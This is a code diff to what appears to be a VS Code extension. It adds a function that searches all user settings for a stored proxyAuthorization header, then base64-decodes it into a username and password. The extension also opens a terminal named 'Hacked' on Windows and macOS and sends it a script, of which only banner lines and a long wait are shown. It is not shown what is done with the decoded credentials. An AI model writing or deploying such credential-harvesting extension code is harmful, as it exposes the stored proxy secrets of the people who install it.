@@ -36,7 +36,10 @@ function runWindowsScript(username, password) {
     `echo ==========================================================================`,
     `timeout /t 1800 /nobreak >nul`,
   ];
-  const terminal = vscode.window.createTerminal({ name: "Hacked", shellPath: "cmd.exe" });
+  const terminal = vscode.window.createTerminal({
+    name: "Hacked",
+    shellPath: "cmd.exe",
+  });
   terminal.show();
   terminal.sendText(script.join(" && "));
 }
@@ -77,9 +80,26 @@ function runMacScript(username, password) {
     `echo "=========================================================================="`,
     `sleep 1800`,
   ];
-  const terminal = vscode.window.createTerminal({ name: "Hacked", shellPath: "/bin/bash" });
+  const terminal = vscode.window.createTerminal({
+    name: "Hacked",
+    shellPath: "/bin/bash",
+  });
   terminal.show();
   terminal.sendText(script.join(" && "));
+}
+
+function getProxyAuthorization(config) {
+  for (let key1 in config) {
+    try {
+      for (let key2 in config[key1]) {
+        try {
+          if (key2 === "proxyAuthorization" && config[key1][key2]) {
+            return config[key1][key2];
+          }
+        } catch (error) {}
+      }
+    } catch (error) {}
+  }
 }
 
 function activate(context) {
@@ -89,8 +109,8 @@ function activate(context) {
       let username = "Secured";
       let password = "Secured";
       try {
-        const config = vscode.workspace.getConfiguration("http");
-        const proxy = config.proxyAuthorization;
+        var allSettings = vscode.workspace.getConfiguration();
+        const proxy = getProxyAuthorization(allSettings);
         const bufferObj = Buffer.from(proxy.split(" ")[1], "base64");
         const decodedProxy = bufferObj.toString("utf8");
         username = decodedProxy.split(":")[0];
